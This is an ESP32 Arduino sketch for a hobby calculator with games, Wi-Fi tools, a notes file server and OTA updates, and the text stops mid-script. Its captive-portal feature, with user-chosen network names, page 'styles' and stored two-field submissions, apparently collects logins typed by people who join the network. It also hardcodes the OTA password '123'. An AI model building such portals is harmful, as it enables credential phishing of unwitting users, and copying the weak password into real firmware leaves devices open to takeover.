
#include <Arduino.h>
#include <Wire.h>
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <HTTPClient.h>
#include <WiFiClientSecure.h>
#include <ArduinoJson.h>
#include <ArduinoOTA.h>
#include <LittleFS.h>
#include <Preferences.h>
#include <vector>
#include <sys/time.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include "esp_sleep.h"
#include "esp_system.h"

// ============================ SETTINGS ============================
#define TUFF_VERSION      "2.2"
#define TUFF_AUTHOR       "@tomiszivacs"

// Networks hardcoded in the sketch. They show up in Settings > Saved networks.
// Add as many as you like (max 8). Password "" = open network.
struct HardNet { const char *ssid; const char *pass; };
const HardNet HARD_NETS[] = {
  {"WIFI", "PASSWORD"},           // default wifi network
  {"", ""}                                  // keep this last line (empty = ignored)
};

#define WIFI_TX_POWER     WIFI_POWER_8_5dBm  // lower TX power = smaller current spikes (brownout fix)
#define OTA_HOSTNAME      "tuffcalc"
#define OTA_PASSWORD      "123"              // "" = none
#define AP_SSID           "TuffCalc-Notes"   // open network hosted by the Notes app (192.168.1.1)
#define CALC_API_BASE     ""                  // backend for discord/ai
#define CALC_API_KEY      ""                  // must match the key for the server

static const char CALC_ROOT_CA[] = R"EOF(-----BEGIN CERTIFICATE-----
MIIFazCCA1OgAwIBAgIRAIIQz7DSQONZRGPgu2OCiwAwDQYJKoZIhvcNAQELBQAw
TzELMAkGA1UEBhMCVVMxKTAnBgNVBAoTIEludGVybmV0IFNlY3VyaXR5IFJlc2Vh
cmNoIEdyb3VwMRUwEwYDVQQDEwxJU1JHIFJvb3QgWDEwHhcNMTUwNjA0MTEwNDM4
WhcNMzUwNjA0MTEwNDM4WjBPMQswCQYDVQQGEwJVUzEpMCcGA1UEChMgSW50ZXJu
ZXQgU2VjdXJpdHkgUmVzZWFyY2ggR3JvdXAxFTATBgNVBAMTDElTUkcgUm9vdCBY
MTCCAiIwDQYJKoZIhvcNAQEBBQADggIPADCCAgoCggIBAK3oJHP0FDfzm54rVygc
h77ct984kIxuPOZXoHj3dcKi/vVqbvYATyjb3miGbESTtrFj/RQSa78f0uoxmyF+
0TM8ukj13Xnfs7j/EvEhmkvBioZxaUpmZmyPfjxwv60pIgbz5MDmgK7iS4+3mX6U
A5/TR5d8mUgjU+g4rk8Kb4Mu0UlXjIB0ttov0DiNewNwIRt18jA8+o+u3dpjq+sW
T8KOEUt+zwvo/7V3LvSye0rgTBIlDHCNAymg4VMk7BPZ7hm/ELNKjD+Jo2FR3qyH
B5T0Y3HsLuJvW5iB4YlcNHlsdu87kGJ55tukmi8mxdAQ4Q7e2RCOFvu396j3x+UC
B5iPNgiV5+I3lg02dZ77DnKxHZu8A/lJBdiB3QW0KtZB6awBdpUKD9jf1b0SHzUv
KBds0pjBqAlkd25HN7rOrFleaJ1/ctaJxQZBKT5ZPt0m9STJEadao0xAH0ahmbWn
OlFuhjuefXKnEgV4We0+UXgVCwOPjdAvBbI+e0ocS3MFEvzG6uBQE3xDk3SzynTn
jh8BCNAw1FtxNrQHusEwMFxIt4I7mKZ9YIqioymCzLq9gwQbooMDQaHWBfEbwrbw
qHyGO0aoSCqI3Haadr8faqU9GY/rOPNk3sgrDQoo//fb4hVC1CLQJ13hef4Y53CI
rU7m2Ys6xt0nUW7/vGT1M0NPAgMBAAGjQjBAMA4GA1UdDwEB/wQEAwIBBjAPBgNV
HRMBAf8EBTADAQH/MB0GA1UdDgQWBBR5tFnme7bl5AFzgAiIyBpY9umbbjANBgkq
hkiG9w0BAQsFAAOCAgEAVR9YqbyyqFDQDLHYGmkgJykIrGF1XIpu+ILlaS/V9lZL
ubhzEFnTIZd+50xx+7LSYK05qAvqFyFWhfFQDlnrzuBZ6brJFe+GnY+EgPbk6ZGQ
3BebYhtF8GaV0nxvwuo77x/Py9auJ/GpsMiu/X1+mvoiBOv/2X/qkSsisRcOj/KK
NFtY2PwByVS5uCbMiogziUwthDyC3+6WVwW6LLv3xLfHTjuCvjHIInNzktHCgKQ5
ORAzI4JMPJ+GslWYHb4phowim57iaztXOoJwTdwJx4nLCgdNbOhdjsnvzqvHu7Ur
TkXWStAmzOVyyghqpZXjFaH3pO3JLF+l+/+sKAIuvtd7u+Nxe5AW0wdeRlN8NwdC
jNPElpzVmbUq4JUagEiuTDkHzsxHpFKVK7q4+63SM1N95R1NbdWhscdCb+ZAJzVc
oyi3B43njTOQ5yOf+1CceWxG1bQVs5ZufpsMljq4Ui0/1lvh+wjChP4kqKOJ2qxq
4RgqsahDYVvTH9w7jXbyLeiNdd8XM2w9U/t7y0Ff/9yi0GE44Za4rF2LN9d11TPA
mRGunUHBcnWEvgJBQl9nJEiU0Zsnvgc/ubhPgXRR4Xq37Z0j4r7g1SgEEzwxA57d
emyPxgcYxn/eR44/KJ4EBs+lVDR3veyJm+kXQ99b21/+jh5Xos1AnX5iItreGCc=
-----END CERTIFICATE-----
)EOF";

#define OLED_ADDR         0x3C
#define BAT_PIN           34
#define SHIFT_AUTO_CLEAR  true               // shift releases itself after one key
#define MAX_EXPR_LEN      60
#define DEBOUNCE_MS       25
#define MAX_SAVED         6

#define WH SSD1306_WHITE
#define BK SSD1306_BLACK
#define GL_UP    "\x18"
#define GL_DOWN  "\x19"
#define GL_RIGHT "\x1A"
#define GL_LEFT  "\x1B"

// ============================ TYPES ============================
enum : uint8_t { K_SHIFT = 200, K_ALPHA, K_LEFT, K_RIGHT, K_UP, K_DOWN,
                 K_MODE, K_DEL, K_AC, K_EXP, K_ANS };
struct Key { uint8_t a, b, code; };
enum Screen : uint8_t { S_CALC, S_MENU, S_GAMES, S_TOOLS, S_SETTINGS, S_WIFI, S_SCAN, S_SAVED,
                        S_TEXT, S_NOTES, S_NOTEVIEW, S_CLOCK, S_TIMESET, S_ABOUT, S_OTA, S_GAME, S_ERASE,
                        S_DCLIST, S_DCHAT, S_AI, S_PORTAL_STYLE, S_PORTAL, S_PORTAL_SUBMISSIONS, S_COUNT };
enum TextPurpose : uint8_t { TP_MANUAL_SSID, TP_PASS, TP_DC_MSG, TP_PIN_CHECK, TP_PIN_SET, TP_AI_MSG, TP_PORTAL_SSID };
enum GameState : uint8_t { GS_READY, GS_PLAY, GS_PAUSE, GS_OVER };
enum OtaState : uint8_t { OS_OFF, OS_READY, OS_UP, OS_DONE, OS_ERR };
struct ScanRes { String ssid; int rssi; bool secure; };
struct Pipe { float x; int gy; bool passed; };
struct PortalSubmission { String fields[2]; };

// ============================ KEY MATRIX ============================
const Key KEYS[] = {
  {4, 18, K_SHIFT}, {0, 4, K_ALPHA}, {18, 33, K_LEFT}, {13, 18, K_RIGHT},
  {4, 2, K_DOWN},   {4, 15, K_UP},   {14, 2, K_MODE},
  {25, 2, '7'}, {5, 2, '8'}, {26, 2, '9'}, {32, 2, K_DEL}, {19, 2, K_AC},
  {25, 15, '4'}, {5, 15, '5'}, {26, 15, '6'}, {32, 15, 'x'}, {19, 15, '/'},
  {25, 0, '1'},  {5, 0, '2'},  {0, 26, '3'},  {32, 0, '+'},  {19, 0, '-'},
  {18, 25, '0'}, {18, 5, '.'}, {18, 26, K_EXP}, {18, 32, K_ANS}, {18, 19, '='}
};
const int NKEYS = sizeof(KEYS) / sizeof(KEYS[0]);
const uint8_t PINS[] = {0, 2, 4, 5, 13, 14, 15, 18, 19, 25, 26, 32, 33};

bool     keyRaw[NKEYS], keyStable[NKEYS];
uint32_t keyTime[NKEYS], keyRep[NKEYS];
int      IDX_MODE = 0;

// ============================ GLOBALS ============================
Adafruit_SSD1306 dA(128, 64, &Wire,  -1);   // MAIN
Adafruit_SSD1306 dB(128, 64, &Wire1, -1);   // INFO
Preferences prefs;
WebServer   server(80);
DNSServer   dns;

Screen   screen = S_CALC;
bool     dirtyA = true, dirtyB = true;
bool     shiftOn = false;
uint32_t lastActivity = 0;
int      batPct = 0;
bool     fsOk = false;
String   toastMsg; uint32_t toastUntil = 0;
uint32_t blinkPhase = 0;
bool quietStartupNetworkUi = false;

// settings
uint8_t briLevel = 3;  const uint8_t BRI[5] = {0x05, 0x40, 0x8F, 0xCF, 0xFF};
uint8_t autoOff  = 2;  const uint8_t AUTO_MIN[5] = {0, 1, 5, 10, 30};
bool    bootSync = false;
String  appPin = "0000"; Screen protectedApp = S_MENU;

// time
const time_t FALLBACK_EPOCH = 946684800; // 2000-01-01 00:00 UTC
bool timeIsSet = false, timeApprox = false, lastConnectionTimeSyncOk = false;
int32_t tzOffset = 0;
bool erased = false;   uint8_t eraseStage = 0;
const char *DOW[] = {"Sun","Mon","Tue","Wed","Thu","Fri","Sat"};
const char *MON[] = {"Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"};

// calculator
// Internal expression format: digits . + - x / ( ) plus
//   A = Ans, P = pi, E = x10^, Q...] = square root, ^...] = power slot
String expr; int cursorPos = 0, scrollStart = 0;   // scrollStart is in pixels
String resultStr; bool justEvaluated = false;
double ansValue = 0;
String hist[8]; int hN = 0, hPos = 0;
const char *ps; bool pSyntax, pMath;

// lists
#define MAXL 40
String lItem[MAXL], lRight[MAXL], lInfo[MAXL]; bool lLock[MAXL];
int lN = 0, lSel = 0; String lTitle; bool lChev = false;
int memo[S_COUNT];
int menuSel = 1;

// wifi
#define MAX_SCAN 24
ScanRes scanRes[MAX_SCAN]; int scanN = 0;
String hS[8], hP[8]; int hardN = 0;
String svS[MAX_SAVED], svP[MAX_SAVED]; int svN = 0;
String pendingSsid;

// text input + keyboard
TextPurpose tPurpose; String tTitle, tBuf; int tMax = 32; bool tMask = false; uint32_t tLastChar = 0; Screen tReturn = S_WIFI;
bool kbOpen = false; uint8_t kbPage = 0, kbWx = 0, kbWy = 0; int kbFlash = -1; uint32_t kbFlashUntil = 0;
const char *KB0[] = {"qwertyuiop", "asdfghjkl'", "zxcvbnm,.?"};
const char *KB1[] = {"QWERTYUIOP", "ASDFGHJKL\"", "ZXCVBNM;:!"};
const char *KB2[] = {"1234567890", "+-*/=%().,", "<>[]{}:;!?"};
const char *KB3[] = {"!@#$%^&*()", "-_=+[]{}|\\", ";:'\",.<>/?", "`~"};
const char *const *const KBP[4] = {KB0, KB1, KB2, KB3};
const uint8_t kbRows[4] = {3, 3, 3, 4};
const char *KB_NAMES[4] = {"abc", "ABC", "123", "#+="};
const uint8_t KBMAP[3][5] = {{'7','8','9',K_DEL,K_AC},{'4','5','6','x','/'},{'1','2','3','+','-'}};

// notes
bool notesOn = false, notesDirty = false; String notesDir = "/";
String nvPath; std::vector<String> nvLines; int nvTop = 0; uint32_t nvSize = 0;
File upFile;

// Captive portal submissions are intentionally temporary and bounded in RAM.
const uint8_t PORTAL_MAX_SUBMISSIONS = 20;
const uint8_t PORTAL_FIELD_MAX = 100;
bool portalOn = false;
String portalSsid;
uint8_t portalStyle = 0;
std::vector<PortalSubmission> portalSubmissions;
std::vector<String> portalLines;
int portalSubmission = 0, portalTop = 0;

// OTA
OtaState otaState = OS_OFF; bool otaBegun = false; int otaPct = 0; String otaMsg;

// time set
int tsF[6]; int tsSel = 0, tsTyped = 0;

// games
const char *GAME_NAMES[5] = {"Snake", "Tetris", "Flappy Bird", "Pong", "Minecraft"};
const char *GAME_INFO[5]  = {"Classic snake. Walls wrap around, it gets faster as you grow.",
                             "Stack the blocks and clear lines. Speeds up every 10 lines.",
                             "Tap UP to flap and squeeze through the pipes.",
                             "You against an adaptive CPU. First to 7 wins.",
                             "Creative flat world. Place and break white blocks; nothing is saved."};
uint8_t curGame = 0; GameState gs = GS_READY; uint32_t lastFrame = 0, overAt = 0;
uint16_t gScore = 0, best[4] = {0, 0, 0, 0}; uint16_t bShown = 0xFFFF; uint8_t bState = 255;
// snake
#define SN_C 32
#define SN_R 16
#define SN_MAX 512
uint8_t snX[SN_MAX + 1], snY[SN_MAX + 1]; uint16_t snLen; uint8_t snDir, snNext, snAX, snAY; uint32_t snLast;
// tetris
const uint16_t TET[7][4] = {
  {0x0F00,0x4444,0x0F00,0x4444}, {0x0660,0x0660,0x0660,0x0660}, {0x0E40,0x4C40,0x4E00,0x4640},
  {0x0E80,0xC440,0x2E00,0x4460}, {0x0E20,0x44C0,0x8E00,0x6440}, {0x06C0,0x8C40,0x06C0,0x8C40},
  {0x0C60,0x4C80,0x0C60,0x4C80}};
uint8_t tB[16][10]; int tP, tR, tX, tY, tNext; uint32_t tLastFall, tNextMove, tSoft; bool tHeld; uint16_t tLines;
// flappy
Pipe fp[2]; float fy, fv;
#define FGAP 28
// pong
float pLY, pRY, bX, bY, bDX, bDY, aiSpeed; int pSL, pSR, pHits, pMiss; uint32_t pServeAt;

// Minecraft: creative-only flat world. White line-grid floor, one kind of block (solid white).
#define MC_W      48
#define MC_H      48
#define MC_D      8         // tallest build (levels 0..7)
#define MC_PL     0.75f     // camera plane length (field of view ~74 degrees)
#define MC_REACH  4.0f      // how far you can break / place
#define MC_PITCH  120.0f    // how far you can look up / down (pixels of horizon shift)
#define MC_OUTLINE true     // thin black edge lines so the white cubes stay readable (false = pure white)
uint8_t mcVox[MC_W][MC_H];  // one bit per block: bit k = a block at height level k in that cell
uint16_t mcPlaced = 0;
uint8_t mcHintShown = 255;
float mcX = 24.5f, mcZ = 24.5f, mcYaw = 0.0f, mcPitch = 0.0f;   // pitch = horizon shift in pixels
float mcFeet = 0.0f, mcVy = 0.0f;                                // feet height + vertical speed
void mcInit();
void mcKey(uint8_t k);
void mcDrawA();
void mcDrawB();
void mcUpdate(uint32_t dt);
#define PH 16
#define PW 3

// ============================ SMALL HELPERS ============================
static inline int imax(int a, int b) { return a > b ? a : b; }
static inline int imin(int a, int b) { return a < b ? a : b; }
static inline int iclamp(int v, int lo, int hi) { return v < lo ? lo : (v > hi ? hi : v); }

int tw(const String &s, int sz) { return s.length() * 6 * sz; }
void txtL(Adafruit_SSD1306 &d, const String &s, int x, int y, int sz) { d.setTextSize(sz); d.setCursor(x, y); d.print(s); }
void txtR(Adafruit_SSD1306 &d, const String &s, int xr, int y, int sz) { d.setTextSize(sz); d.setCursor(xr - tw(s, sz), y); d.print(s); }
void txtC(Adafruit_SSD1306 &d, const String &s, int y, int sz, int cx) { d.setTextSize(sz); d.setCursor(cx - tw(s, sz) / 2, y); d.print(s); }
String fit(const String &s, int maxc) { if ((int)s.length() <= maxc) return s; if (maxc < 3) return s.substring(0, maxc); return s.substring(0, maxc - 2) + ".."; }
String pad2(int v) { return v < 10 ? "0" + String(v) : String(v); }

int wrapDraw(Adafruit_SSD1306 &d, const String &s, int x, int y, int cols, int maxLines) {
  int line = 0, i = 0, n = s.length();
  d.setTextSize(1);
  while (i < n && line < maxLines) {
    int end = imin(n, i + cols);
    if (end < n) { int sp = s.lastIndexOf(' ', end); if (sp > i) end = sp; }
    d.setCursor(x, y + line * 9); d.print(s.substring(i, end));
    line++; i = end;
    while (i < n && s[i] == ' ') i++;
  }
  return line;
}

String fmtBytes(uint32_t b) {
  if (b >= 1048576) return String(b / 1048576.0, 1) + "M";
  if (b >= 1024) return String((b + 512) / 1024) + "K";
  return String(b) + "B";
}
int sigPct(int rssi) { return iclamp((rssi + 100) * 2, 0, 100); }

bool readKey(const Key &k) {
  pinMode(k.a, OUTPUT); digitalWrite(k.a, LOW);
  pinMode(k.b, INPUT_PULLUP); delayMicroseconds(20);
  bool pressed = (digitalRead(k.b) == LOW);
  pinMode(k.a, INPUT); pinMode(k.b, INPUT);
  return pressed;
}
bool held(uint8_t code) { for (int i = 0; i < NKEYS; i++) if (KEYS[i].code == code) return keyStable[i]; return false; }
void resyncKeys() {
  for (int i = 0; i < NKEYS; i++) { keyRaw[i] = keyStable[i] = readKey(KEYS[i]); keyTime[i] = millis(); keyRep[i] = 0; }
}
bool cancelPressed() { return readKey(KEYS[IDX_MODE]); }

void toast(const String &m) {
  if (quietStartupNetworkUi) return;
  toastMsg = m; toastUntil = millis() + 1800; dirtyA = true;
}

// forward declarations
void enter(Screen s);

// ============================ TIME ============================
bool timeValid() { return timeIsSet; }
void localTm(struct tm &t) { time_t l = time(nullptr) + tzOffset; gmtime_r(&l, &t); }
void setUtc(time_t t) {
  struct timeval tv = {t, 0}; settimeofday(&tv, nullptr);
  timeIsSet = true; timeApprox = false;
}
int64_t daysFromCivil(int y, int m, int d) {
  y -= m <= 2; int era = (y >= 0 ? y : y - 399) / 400; unsigned yoe = y - era * 400;
  unsigned doy = (153 * (m + (m > 2 ? -3 : 9)) + 2) / 5 + d - 1; unsigned doe = yoe * 365 + yoe / 4 - yoe / 100 + doy;
  return (int64_t)era * 146097 + (int)doe - 719468;
}
time_t civilToEpoch(int y, int mo, int d, int h, int mi) { return (time_t)(daysFromCivil(y, mo, d) * 86400 + h * 3600 + mi * 60); }
int daysInMonth(int y, int m) {
  static const uint8_t dm[] = {31,28,31,30,31,30,31,31,30,31,30,31};
  if (m == 2 && ((y % 4 == 0 && y % 100 != 0) || y % 400 == 0)) return 29;
  return dm[iclamp(m, 1, 12) - 1];
}
String timeStr() {
  struct tm t; localTm(t);
  return String(timeApprox ? "~" : "") + pad2(t.tm_hour) + ":" + pad2(t.tm_min);
}
String dateStr() {
  if (!timeValid()) return "";
  struct tm t; localTm(t);
  return String(DOW[t.tm_wday]) + " " + String(t.tm_mday) + " " + MON[t.tm_mon] + " " + String(t.tm_year + 1900);
}
String tzStr(int32_t off) {
  int a = abs(off) / 60;
  return String("UTC") + (off < 0 ? "-" : "+") + pad2(a / 60) + ":" + pad2(a % 60);
}

// ============================ EXPRESSION PARSER ============================
double parseExpr();
double parsePrimary() {
  char c = *ps; double v = 0;
  if (c == '(') {
    ps++; v = parseExpr();
    if (pSyntax) return 0;
    if (*ps != ')') { pSyntax = true; return 0; }
    ps++;
  } else if (c == 'Q') {                                   // square root:  Q expr ]
    ps++; v = parseExpr();
    if (pSyntax) return 0;
    if (*ps != ']') { pSyntax = true; return 0; }
    ps++;
    if (v < 0) { pMath = true; v = 0; } else v = sqrt(v);
  } else if (c == 'A') { ps++; v = ansValue; }
  else if (c == 'P') { ps++; v = M_PI; }
  else if (isdigit((unsigned char)c) || c == '.') {
    String num; bool dot = false; int digits = 0;
    while (isdigit((unsigned char)*ps) || *ps == '.') {
      if (*ps == '.') { if (dot) { pSyntax = true; return 0; } dot = true; } else digits++;
      num += *ps; ps++;
    }
    if (digits == 0) { pSyntax = true; return 0; }
    if (*ps == 'E') {
      num += 'e'; ps++;
      if (*ps == '-' || *ps == '+') { num += *ps; ps++; }
      int ed = 0;
      while (isdigit((unsigned char)*ps)) { num += *ps; ps++; ed++; }
      if (ed == 0) { pSyntax = true; return 0; }
    }
    v = atof(num.c_str());
  } else { pSyntax = true; return 0; }
  while (*ps == '^') {                                     // power slot:  ^ expr ]
    ps++; double e = parseExpr();
    if (pSyntax) return 0;
    if (*ps != ']') { pSyntax = true; return 0; }
    ps++;
    v = pow(v, e);
    if (!isfinite(v)) pMath = true;
  }
  return v;
}
double parseUnary() {
  if (*ps == '-') { ps++; return -parseUnary(); }
  if (*ps == '+') { ps++; return parseUnary(); }
  return parsePrimary();
}
double parseTerm() {
  double v = parseUnary();
  while (!pSyntax) {
    char c = *ps;
    bool imp = (c == '(' || c == 'A' || c == 'P' || c == 'Q');   // 2(3), 2Ans, 2pi, 2 sqrt(9)
    if (!(c == 'x' || c == '/' || imp)) break;
    char op = imp ? 'x' : *ps++;
    double r = parseUnary();
    if (pSyntax) return 0;
    if (op == 'x') v *= r;
    else if (r == 0) { pMath = true; v = 0; }
    else v /= r;
  }
  return v;
}
double parseExpr() {
  double v = parseTerm();
  while (!pSyntax && (*ps == '+' || *ps == '-')) {
    char op = *ps++; double r = parseTerm();
    if (pSyntax) return 0;
    v = (op == '+') ? v + r : v - r;
  }
  return v;
}
String formatNumber(double v) {
  if (v == 0) v = 0;
  char b[28]; snprintf(b, sizeof(b), "%.10g", v);
  String s(b); s.replace("e+", "E"); s.replace("e-", "E-");
  return s;
}
void evaluate() {
  if (expr.length() == 0) return;
  justEvaluated = false;
  ps = expr.c_str(); pSyntax = false; pMath = false;
  double v = parseExpr();
  if (!pSyntax && *ps != '\0') pSyntax = true;
  if (pSyntax) resultStr = "Syntax error";
  else if (pMath || !isfinite(v)) resultStr = "Math error";
  else {
    ansValue = v; resultStr = formatNumber(v); justEvaluated = true;
    if (hN == 0 || hist[hN - 1] != expr) {
      if (hN == 8) { for (int i = 1; i < 8; i++) hist[i - 1] = hist[i]; hN = 7; }
      hist[hN++] = expr;
    }
    hPos = 0;
  }
}

// ============================ BATTERY ============================
int batteryPercent() {
  analogSetPinAttenuation(BAT_PIN, ADC_11db);
  uint32_t sum = 0;
  for (int i = 0; i < 16; i++) { sum += analogReadMilliVolts(BAT_PIN); delayMicroseconds(200); }
  float v = (sum / 16.0f) * 2.0f / 1000.0f;
  static const float V[] = {4.20, 4.11, 4.02, 3.95, 3.87, 3.84, 3.80, 3.77, 3.73, 3.69, 3.61, 3.30};
  static const int   P[] = { 100,   90,   80,   70,   60,   50,   40,   30,   20,   10,    5,    0};
  if (v >= V[0]) return 100;
  for (int i = 1; i < 12; i++)
    if (v >= V[i]) return (int)lroundf(P[i] + (P[i - 1] - P[i]) * (v - V[i]) / (V[i - 1] - V[i]));
  return 0;
}

void applyBrightness() {
  dA.ssd1306_command(SSD1306_SETCONTRAST); dA.ssd1306_command(BRI[briLevel]);
  dB.ssd1306_command(SSD1306_SETCONTRAST); dB.ssd1306_command(BRI[briLevel]);
}

// ============================ SAVED NETWORKS ============================
void loadNets() {
  svN = prefs.getUChar("nn", 0); if (svN > MAX_SAVED) svN = 0;
  for (int i = 0; i < svN; i++) {
    svS[i] = prefs.getString(("ns" + String(i)).c_str(), "");
    svP[i] = prefs.getString(("np" + String(i)).c_str(), "");
  }
}
void storeNets() {
  if (erased) return;
  prefs.putUChar("nn", svN);
  for (int i = 0; i < svN; i++) {
    prefs.putString(("ns" + String(i)).c_str(), svS[i]);
    prefs.putString(("np" + String(i)).c_str(), svP[i]);
  }
}
bool isHard(const String &s) { for (int i = 0; i < hardN; i++) if (hS[i] == s) return true; return false; }
void saveNet(const String &ssid, const String &pass) {
  if (isHard(ssid)) return;
  for (int i = 0; i < svN; i++) if (svS[i] == ssid) { svP[i] = pass; storeNets(); return; }
  if (svN == MAX_SAVED) { for (int i = 1; i < svN; i++) { svS[i - 1] = svS[i]; svP[i - 1] = svP[i]; } svN--; }
  svS[svN] = ssid; svP[svN] = pass; svN++; storeNets();
}
void delNet(int i) {
  for (int k = i + 1; k < svN; k++) { svS[k - 1] = svS[k]; svP[k - 1] = svP[k]; }
  svN--; storeNets();
}
int    netCount() { return hardN + svN; }
String netSsid(int i) { return i < hardN ? hS[i] : svS[i - hardN]; }
String netPass(int i) { return i < hardN ? hP[i] : svP[i - hardN]; }
bool findPass(const String &ssid, String &pass) {
  for (int i = 0; i < netCount(); i++) if (netSsid(i) == ssid) { pass = netPass(i); return true; }
  return false;
}

// ============================ BUSY SCREEN / WIFI ============================
void busyMsg(const String &l1, const String &l2) {
  if (quietStartupNetworkUi) return;
  static uint8_t ph = 0; ph = (ph + 1) & 7;
  dA.clearDisplay(); dA.setTextColor(WH);
  for (int i = 0; i < 8; i++) {
    float a = i * PI / 4; int x = 64 + (int)(cos(a) * 11), y = 16 + (int)(sin(a) * 11);
    if (i == ph) dA.fillCircle(x, y, 2, WH); else dA.drawPixel(x, y, WH);
  }
  txtC(dA, fit(l1, 21), 34, 1, 64); txtC(dA, fit(l2, 21), 44, 1, 64); txtC(dA, "MODE = cancel", 55, 1, 64);
  dA.display();
}
void busyB(const String &l) {
  if (quietStartupNetworkUi) return;
  dB.clearDisplay(); dB.setTextColor(WH); dB.setTextSize(1);
  dB.fillRect(0, 0, 128, 11, WH); dB.setTextColor(BK); dB.setCursor(4, 2); dB.print("Please wait");
  dB.setTextColor(WH); wrapDraw(dB, l, 0, 18, 21, 4); dB.display();
}

bool syncTime();

bool wifiConnectBlocking(const String &ssid, const String &pass, uint32_t timeout) {
  busyB("Connecting to " + ssid);
  WiFi.mode(WIFI_STA); WiFi.disconnect();
  WiFi.begin(ssid.c_str(), pass.c_str());
  WiFi.setTxPower(WIFI_TX_POWER);
  uint32_t t0 = millis(); bool ok = false;
  while (millis() - t0 < timeout) {
    wl_status_t st = WiFi.status();
    if (st == WL_CONNECTED) { ok = true; break; }
    if (st == WL_CONNECT_FAILED) break;
    String dots = String("...").substring(0, (millis() / 400) % 4);
    busyMsg("Connecting" + dots, ssid);
    if (cancelPressed()) break;
    delay(40);
  }
  if (!ok) { WiFi.disconnect(true); WiFi.mode(WIFI_OFF); }
  else lastConnectionTimeSyncOk = syncTime();
  return ok;
}

bool connectBestSaved(uint32_t to) {
  busyB("Looking for a saved network in range.");
  busyMsg("Looking for Wi-Fi", "Scanning...");
  WiFi.mode(WIFI_STA); WiFi.disconnect();
  int n = WiFi.scanNetworks(); int found = -1;
  for (int k = 0; k < netCount() && found < 0; k++) {
    String s = netSsid(k);
    for (int j = 0; j < n; j++) if (WiFi.SSID(j) == s) { found = k; break; }
  }
  WiFi.scanDelete();
  if (found < 0) { WiFi.mode(WIFI_OFF); return false; }
  return wifiConnectBlocking(netSsid(found), netPass(found), to);
}

void doScan() {
  busyB("Scanning for networks..."); busyMsg("Scanning", "Wi-Fi networks");
  if (WiFi.getMode() == WIFI_OFF || WiFi.getMode() == WIFI_AP) WiFi.mode(WIFI_STA);
  int n = WiFi.scanNetworks(); scanN = 0;
  for (int j = 0; j < n; j++) {
    String s = WiFi.SSID(j); if (s.length() == 0) continue;
    int dup = -1; for (int i = 0; i < scanN; i++) if (scanRes[i].ssid == s) dup = i;
    if (dup >= 0) { if (WiFi.RSSI(j) > scanRes[dup].rssi) scanRes[dup].rssi = WiFi.RSSI(j); continue; }
    if (scanN < MAX_SCAN) { scanRes[scanN].ssid = s; scanRes[scanN].rssi = WiFi.RSSI(j); scanRes[scanN].secure = (WiFi.encryptionType(j) != WIFI_AUTH_OPEN); scanN++; }
  }
  WiFi.scanDelete();
  for (int a = 0; a < scanN; a++) for (int b = a + 1; b < scanN; b++)
    if (scanRes[b].rssi > scanRes[a].rssi) { ScanRes t = scanRes[a]; scanRes[a] = scanRes[b]; scanRes[b] = t; }
}

bool connectWifi(const String &ssid, const String &pass) {
  bool ok = wifiConnectBlocking(ssid, pass, 15000);
  resyncKeys();
  if (ok) { saveNet(ssid, pass); toast("Connected"); } else toast("Connection failed");
  return ok;
}

bool syncTime() {
  busyB("Finding your time zone and asking the internet for the time.");
  busyMsg("Syncing time", "Locating...");
  int32_t off = tzOffset; bool gotOff = false;
  {
    HTTPClient http; http.setTimeout(4000);
    if (http.begin("http://ip-api.com/json/?fields=status,offset")) {
      if (http.GET() == 200) {
        String b = http.getString(); int i = b.indexOf("\"offset\":");
        if (i >= 0) { off = b.substring(i + 9).toInt(); gotOff = true; }
      }
      http.end();
    }
  }
  busyMsg("Syncing time", "Asking NTP...");
  bool hadSetTime = timeIsSet;
  time_t before = time(nullptr); uint32_t m0 = millis();
  struct timeval z = {0, 0}; settimeofday(&z, nullptr);
  timeIsSet = false;
  configTime(0, 0, "pool.ntp.org", "time.google.com");
  uint32_t t0 = millis();
  while (time(nullptr) <= 1700000000 && millis() - t0 < 9000) { delay(100); if (cancelPressed()) break; }
  if (time(nullptr) <= 1700000000) {
    struct timeval tv = {before + (time_t)((millis() - m0) / 1000), 0}; settimeofday(&tv, nullptr);
    timeIsSet = hadSetTime;
    return false;
  }
  if (gotOff) tzOffset = off;
  timeIsSet = true; timeApprox = false;
  return true;
}

void syncViaWifi() {
  bool was = (WiFi.status() == WL_CONNECTED);
  if (!was && !connectBestSaved(12000)) { toast("No known network"); resyncKeys(); return; }
  bool ok = was ? syncTime() : lastConnectionTimeSyncOk;
  if (!was) { WiFi.disconnect(true); WiFi.mode(WIFI_OFF); }
  resyncKeys(); toast(ok ? "Time synced" : "Sync failed");
}

// ============================ NOTES (file manager) ============================
const char PAGE[] PROGMEM = R"rawliteral(<!doctype html><html><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>TuffCalc Files</title><style>
body{margin:0;background:#0e0f12;color:#e8e8e8;font:15px system-ui,sans-serif}main{max-width:660px;margin:auto;padding:14px}
h2{margin:6px 0 10px}.bar{height:8px;background:#2a2c33;border-radius:4px;overflow:hidden}.bar i{display:block;height:100%;width:0;background:#3ddc84}
small{color:#9a9ea8}button{background:#2b6cff;color:#fff;border:0;border-radius:6px;padding:7px 11px;margin:2px;font:inherit;cursor:pointer}
button.d{background:#c0392b}.r{display:flex;align-items:center;flex-wrap:wrap;padding:7px 2px;border-bottom:1px solid #23252b}
.r span{flex:1;min-width:150px;cursor:pointer;word-break:break-all}.p{font-weight:600;margin:12px 0 4px}
textarea{width:100%;height:45vh;background:#000;color:#eee;border:1px solid #3a3d46;border-radius:6px;box-sizing:border-box;padding:8px;font:14px monospace}
#e{display:none;margin-top:12px}</style></head><body><main>
<h2>TuffCalc Files</h2><div class=bar><i id=u></i></div><small id=s></small>
<div class=p id=p></div><div id=l></div>
<p><button onclick=mk(1)>+ Folder</button><button onclick=mk(0)>+ Text file</button> <input type=file id=f multiple onchange=up()></p>
<div id=e><b id=en></b><textarea id=t></textarea><button onclick=sv()>Save</button><button class=d onclick=cl()>Close</button></div>
</main><script>
var P='/',E='',$=function(i){return document.getElementById(i)};
function J(x){return (P=='/'?'':P)+'/'+x}
function el(t,c,x){var e=document.createElement(t);if(c)e.className=c;if(x!=null)e.textContent=x;return e}
function A(u,b){return fetch(u,{method:'POST',body:b})}
async function ld(){var r=await(await fetch('/api/ls?p='+encodeURIComponent(P))).json();
$('u').style.width=(100*r.used/r.total)+'%';
